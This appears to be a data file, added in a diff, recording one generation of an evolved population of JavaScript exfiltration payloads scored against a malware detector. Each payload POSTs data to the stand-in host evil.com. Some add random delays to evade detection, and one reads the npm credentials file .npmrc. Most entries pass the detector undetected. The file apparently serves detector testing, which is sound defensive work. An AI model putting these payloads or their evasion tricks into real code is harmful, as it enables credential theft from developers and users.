@@ -1,0 +1,61 @@
+{
+  "generation": 6,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); ",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "setTimeout(() => { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  }, Math.random() * 5000);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); ",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "if (require('fs').readFileSync('.npmrc', 'utf8') === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); }",
+      "fitness": 59.5,
+      "isNovel": true,
+      "impact": 43,
+      "verdict": "REVIEW",
+      "confidence": 0.03,
+      "graph": [
+        "[HEURISTIC] → SYSTEM → LIKELY_EXFILTRATION (Reasons: network resolution/transport patterns detected (wt: 0.85))"
+      ]
+    }
+  ]
+}
